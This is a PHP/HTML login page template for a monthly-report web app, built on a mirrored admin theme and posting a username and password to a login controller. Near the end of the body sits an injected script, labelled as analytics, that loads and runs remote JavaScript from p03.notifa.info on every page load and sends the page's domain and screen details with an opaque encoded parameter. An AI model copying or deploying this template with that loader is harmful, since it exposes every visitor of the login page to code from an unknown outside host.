<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from eliteadmin.themedesigner.in/demos/bt4/eliteadmin/pages-login-2.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 17 Mar 2018 17:00:25 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- Tell the browser to be responsive to screen width -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <!-- Favicon icon -->
    <link rel="icon" type="image/png" sizes="16x16" href="<?php echo base_url()?>assets/images/ap-header.png">
    <title>Login Page | Report Bulanan</title>
    
    <!-- page css -->
    <link href="<?php echo base_url()?>assets/dist/css/pages/login-register-lock.css" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="<?php echo base_url()?>assets/dist/css/style.min.css" rel="stylesheet">
    
    
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
</head>
<style type="text/css">
    body {
        background: -webkit-gradient(linear, left top, left bottom, from(rgba(22, 22, 22, 0.3)), color-stop(75%, rgba(22, 22, 22, 0.7)), to(#161616)), url("../img/banner.jpg");
        background: linear-gradient(to bottom, rgba(22, 22, 22, 0.3) 0%, rgba(22, 22, 22, 0.7) 75%, #161616 100%), url("<?php echo base_url()?>assets/images/andrew-neel-cckf4TsHAuw-unsplash-min.jpg");
        background-position: center;
        background-repeat: no-repeat;
        background-attachment: scroll;
        background-size: cover;
    }
</style>
<script type="text/javascript">
    function cekform()
    {
        if(!$("#username").val())
        {
            alert('maaf username tidak boleh kosong');
            $("#username").focus();
            return false;
        }

        if(!$("#password").val())
        {
            alert('maaf password tidak boleh kosong');
            $("#password").focus();
            return false;
        }
    }
</script>

<body>
    <!-- ============================================================== -->
    <!-- Preloader - style you can find in spinners.css -->
    <!-- ============================================================== -->
    <div class="preloader">
        <div class="loader">
            <div class="loader__figure"></div>
            <p class="loader__label">Elite admin</p>
        </div>
    </div>
    <!-- ============================================================== -->
    <!-- Main wrapper - style you can find in pages.scss -->
    <!-- ============================================================== -->
    <section id="wrapper" class="login-register login-sidebar">
        <div class="login-box card">
            <div class="card-body">
                <form method="POST" action="<?php echo base_url();?>index.php/login/getlogin" onsubmit="return cekform();">

                    <a href="javascript:void(0)" class="text-center db"><img src="<?php echo base_url()?>assets/images/ori-logo-ap-corp.png"></a>
                    <hr>
                    <h3 class="box-title m-b-20">Report Bulanan | Login Page</h3>

                    <div class="form-group m-t-40">
                        <div class="col-xs-12">
                            <input class="form-control" type="text" id="username" name="username"  placeholder="Username">
                        </div>
                    </div>
                    <div class="form-group">
                        <div class="col-xs-12">
                            <input class="form-control" type="password" id="password" name="password"  placeholder="Password">
                        </div>
                    </div>
                    <?php 
                    $info =$this->session->flashdata('info');
                    if(!empty($info))
                    {
                        echo $info;
                    }

                    ?>
                    
                    <div class="form-group text-center m-t-20">
                        <div class="col-xs-12">
                            <button class="btn btn-info btn-lg btn-block text-uppercase btn-rounded" type="submit">Log In</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </section>
    <!-- ============================================================== -->
    <!-- End Wrapper -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- All Jquery -->
    <!-- ============================================================== -->
    <script src="<?php echo base_url()?>assets/node_modules/jquery/jquery-3.2.1.min.js"></script>
    <!-- Bootstrap tether Core JavaScript -->
    <script src="<?php echo base_url()?>assets/node_modules/popper/popper.min.js"></script>
    <script src="<?php echo base_url()?>assets/node_modules/bootstrap/dist/js/bootstrap.min.js"></script>
    <!--Custom JavaScript -->
    <script type="text/javascript">
        $(function() {
            $(".preloader").fadeOut();
        });
        $(function() {
            $('[data-toggle="tooltip"]').tooltip()
        });
        // ============================================================== 
        // Login and Recover Password 
        // ============================================================== 
        $('#to-recover').on("click", function() {
            $("#loginform").slideUp();
            $("#recoverform").fadeIn();
        });
    </script>
    
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5myFsTwFUh3iOZicyh8lzzVHDlQUt5%2fYV5t48zmdum%2fqfuFbqezqR%2fPMhsgzy7gT%2bZ%2bAU%2bwwK%2bdRJ942XwaYKPLfl3SOzCm5d3hIvml5U5IrbiGmKxF%2fdvubyjmoDtPBPlIOqigIn4kkFF3Vb23sFmgqY3xzBTkDivprNU9zPNHQV7%2bHEsRScCm9a5wjGN0bHZX%2fG4rXuU73TiPkKa5G5XvXa2b342u1J%2fUf9ZHvrJDDLuPWT81E0WQLILmlbDaALixTlr7tzOjxwH5eUqEDmKSaHbSbREsnFbcxtGK%2fvR8UW2ycBcgEs6Vdggpv%2bRWRtV3sdGo%2bB0v5%2b7SJFgN6GlehV%2bc5ZAxhRAongEJN3nfWWTpnCMQdbPHPpzOwOnKE2fu9v%2b60K%2bbyB5gHh%2bMINcQNOlH94Knxr0xPHHSLe3ctkz7n96lHgDqYCmN2KkF6rm45KdaI1L5CxH2RNiArg4x2VFgZsYy7f76h%2bfXVdlLmKlct%2flLP8FzLfR6G9oDBuMZ3ItUgZdW9o%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


    <!-- Mirrored from eliteadmin.themedesigner.in/demos/bt4/eliteadmin/pages-login-2.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 17 Mar 2018 17:00:25 GMT -->
    </html>